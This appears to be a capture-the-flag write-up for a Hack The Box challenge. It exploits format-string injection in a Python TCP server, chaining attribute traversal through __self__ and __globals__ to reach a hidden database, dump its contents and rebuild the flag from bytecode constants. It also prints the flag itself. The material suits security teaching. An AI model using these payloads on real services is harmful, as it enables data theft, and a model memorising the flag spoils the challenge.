# Vipere - HTB Challenge Writeup

**Category:** Misc  
**Difficulty:** Easy-Medium  
**Flag:** `HTB{cr0iss4nts_ch0c0_hmmmm}`

---

## Overview

We are given the source code of a Python TCP server (`main.py`) running on port 1337. The server accepts user input as a Python format string and substitutes values from a whitelist of three commands: `whoami`, `get_time`, and `get_version`. The goal is to bypass the whitelist and extract hidden credentials from the server.

## Source Code Analysis

The server uses `socketserver` to handle connections. On each request, it prompts the user for a format string, parses it to extract field names, and then runs `text.format(**secure_commands.dispatcher)` to produce output.

The relevant parts:

```python
# Line 28 - Validation: extract field names from user input
requested_commands = [fname for _, fname, _, _ in Formatter().parse(text) if fname]

# Line 29 - Create a SecureCommands instance with those field names
secure_commands = SecureCommands(requested_commands)

# Line 31 - Execute the format string
interface.print(text.format(**secure_commands.dispatcher))
```

The `SecureCommands` class has a dispatcher dict mapping command names to bound methods. During `verify_commands()`, any command that appears in both `requested_commands` and the dispatcher gets called, and its return value (a string) replaces the method in the dict.

There are also some hidden components:

- A `get_infected()` method on `SecureCommands` that references a global `server` variable
- A `SecureBridge` class that imports a `database` module and creates a `SecureDatabase` instance
- A `ServerContext` that stores the bridge as `self.bridge`

## Vulnerability

The vulnerability is a **Python format string injection with attribute traversal**.

Python's `str.format()` supports dotted attribute access (`{obj.attr}`) and bracket key access (`{obj[key]}`). The server's validation uses `Formatter().parse()` to extract field names, but this parser returns the entire dotted path as a single field name.

For example, with input `{get_time.__self__}`:

- `Formatter().parse()` returns the field name `get_time.__self__` (one string)
- This doesn't match `"get_time"` in the dispatcher, so `verify_commands()` skips it
- The method stays as a bound method object (not called/replaced with a string)
- `str.format()` resolves it by looking up `get_time` in the dict, then calling `getattr(result, '__self__')`

This means any dispatcher value that remains as a bound method can be used as a starting point for arbitrary attribute traversal.

## Exploitation

### Step 1 - Confirm the vulnerability

Payload:

```
{get_time.__self__.__class__.__name__}
```

Response: `SecureCommands`

This confirms we can traverse attributes through the bound method.

### Step 2 - Reach the database object

The `get_infected` method on `SecureCommands` references the global `server` variable. Through `__globals__`, we can access it:

```
{get_time.__self__.get_infected.__globals__[server].bridge.db.__dict__}
```

Response:

```python
{'bank_accounts': {'official': 10000, 'offshore': 2125501213}, 'total_infected': 295208501, 'viperebot_new_victims_pairs_ids': ['fd99a310-...', ...]}
```

We have access to the database, but the flag isn't stored as a plain attribute.

### Step 3 - Find the flag

Inspecting the class methods:

```
{get_time.__self__.get_infected.__globals__[server].bridge.db.__class__.__dict__}
```

This reveals a `get_credentials` method. The flag is constructed inside this method rather than stored as a string. To extract it, we pull the method's code object constants:

```
{get_time.__self__.get_infected.__globals__[server].bridge.db.get_credentials.__code__.co_consts}
```

Response:

```python
(None, 72, 'apts_c', 'BT', -1, 'orc', 109, 'ocoh', 'iss', 123, 'p', 'n', '_h', 4, 125, '0', '1', '4', ('o', 'l', 'a'))
```

Along with `co_names = ('chr', 'replace')` and `co_varnames = ('self', 'f', 'a', 'blue', 'c', 'm', 'h', 'i', 'd', 'x')`.

### Step 4 - Reconstruct the flag from bytecode

Tracing through the bytecode using the extracted constants:

```python
f = chr(72)                     # 'H'
    + 'BT'[::-1]               # 'TB'
    + chr(123)                  # '{'
    + 'orc'[::-1]              # 'cro'
    + 'iss'                    # 'iss'
    + 'apts_c'.replace('p','n')# 'ants_c'
    + 'ocoh'[::-1]             # 'hoco'
    + '_h'                     # '_h'
    + chr(109) * 4             # 'mmmm'
    + chr(125)                 # '}'
# = 'HTB{croissants_choco_hmmmm}'

# Then a replacement pass:
# 'o' -> '0', 'l' -> '1', 'a' -> '4'
# = 'HTB{cr0iss4nts_ch0c0_hmmmm}'
```

## Flag

```
HTB{cr0iss4nts_ch0c0_hmmmm}
```

## Takeaway

Never pass user-controlled strings to `str.format()` when the format arguments contain objects with traversable attributes. Use manual string replacement or a sandboxed template engine instead.
